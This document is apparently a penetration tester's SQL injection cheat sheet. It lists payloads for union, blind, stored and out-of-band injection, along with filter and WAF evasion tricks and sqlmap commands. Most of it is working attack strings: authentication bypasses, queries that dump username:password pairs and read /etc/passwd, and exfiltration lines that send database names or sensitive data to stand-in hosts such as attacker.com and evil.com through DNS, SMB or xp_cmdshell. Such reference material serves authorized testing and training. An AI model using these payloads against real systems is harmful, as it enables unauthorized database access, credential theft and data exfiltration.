SQL Injection

  • PayloadAllTheThings
  • PortSwigger

Normal: You have feedback from the application.

  • Use UNION to append a second query and check the table.
  • App returns a query error when false. Use UNION to append a second query and use LIKEwith a wildcard %.

Blind: App doesn't display query results or error messages.

  • Auth Bypass: admin' OR 1=1; -- -, admin' OR 1=1#, admin' OR 1=1--
  • Time-Based: Use SLEEP() to introduce time delay.

Out-of-Band: Force the database server to make an external network request.

  • SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.example.com\\share'));

  • EXEC master..xp_dirtree '\\example.com\share';

  • EXEC xp_cmdshell 'nslookup data.attacker.com';

  • Stored SQL Injection: When you can't retrieve data on spot, but can store a query that will later be used when calling that data from another page.

    • Like a user named elliot' or 1=1; -- would be stored and when listing the users could also list every user.
    • Be careful with update / delete operations with this one.

  • JSON and XML can be vulnerable to SQLi.

Important: Pay attention to the context.

  • Sometimes you'll need to add a ;, sometimes you'll not.
  • Sometimes you'll need to add a ', sometimes you'll not.
  • Sometimes you'll need to use other types of comments ( --, -- -, #, ...).
  • sqlmap The King
  • sqlninja MSSQL
  • jsql-injection Java
  • bbqsql Blind

Normal​

union select 1,2,3 -- -
union select 1,@@version,3 -- -
union select 1,user(),3 -- -
union select 1,load_file('/etc/passwd'),3 -- -
union select 1,load_file(0x2f6574632f706173737764),3 -- - #HEX
union select 1,load_file(char(47,101,116,99,47,112,97,115,115,119,100)),3 -- - #char

-- test fields and get db --
union select 1,2,database()

-- get tables from db --
union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = '$database_name'

-- get columns from table --
union select 1,2,group_concat(column_name) from information_schema.columns where table_name = '$table_name'

-- better way to do it if table returns --
union all select column_name,null,null,null,null from information_schema.columns where table_name="$table_name"`

-- example dump of 'username:password' --
union select 1,2,group_concat(username, ':', password SEPARATOR '<br>') from $table_name

-- example dump of 'username:password' with limit to the first entry --
union select 1, group_concat(user,':', password), 3 from $table_name where user like '%admin%' limit 0,1-- -

MySQL and MariaDB​

SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';

SELECT @@version INTO OUTFILE '\\\\<local_ip>\\logs\\out.txt';

/* SMB */
SELECT sensitive_data INTO OUTFILE '\\\\<local_ip>\\logs\\out.txt';

/* DNS Query with the database name*/
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.evil.com\\share'));

/* the permissions to execute this one are rare */
UPDATE posts SET comments = LOAD_FILE('/etc/passwd') WHERE id = 1;

EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\<local_ip>\logs\out.txt" -c -T';

Filter Evasion​

  • CyberChef

Basic Encoding​

  • URL Encoding and operator filter bypass: a%27%20||%201%3D1%3B%2D%2D%20+
  • Hex Encoding: SELECT * FROM users WHERE name = 0x61646d696e
  • Unicode Encoding: SELECT * FROM users WHERE name = \u0061\u0064\u006D\u0069\u006E
    • "Escape Unicode Characters" with "Encode all chars" in CyberChef.

No Quote​

  • Try to inject without quotes.
  • SQL Comments: admin-- .
  • CONCAT(): CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e).

No Spaces​

  • Open and Close Comment: /**/.
    • SELECT/**/*FROM/**/users/**/WHERE/**/name/**/='admin'
  • Tab or Newline: \t or \n.
    • SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'
  • Alternate Chars:
    • %09 -> Tab ( \t).
    • %0A -> Line feed (\n).
    • %0C -> Form feed (\f).
    • %0D -> Carriage return (\r).
    • %A0 -> Non breaking space.

WAF​

  • Banned Keywords:
    • Change case: SeLEct.
    • CONCAT: CONCAT('a','d','m','i','n')
    • Encode: CHAR(0x61,0x64,0x6D,0x69,0x6E)
  • Banned Spaces: Alternative space chars %0A, %09, /**/, ...
  • Banned Logical Operators: ||, &&.

Sqlmap​

# --start=1 and --stop=1 limits to single row, good for real engagements

sqlmap -u http://example.local/search/cat=1 --dbs # list dbs
sqlmap -u http://example.local/search/cat=1 -D db --tables # list tables
sqlmap -u http://example.local/search/cat=1 -D db -T table --dump # dump content
sqlmap -r intercepted_request.txt # intercept and save a post request
sqlmap -u http://example.local/search/cat=1 --method POST/GET # tests
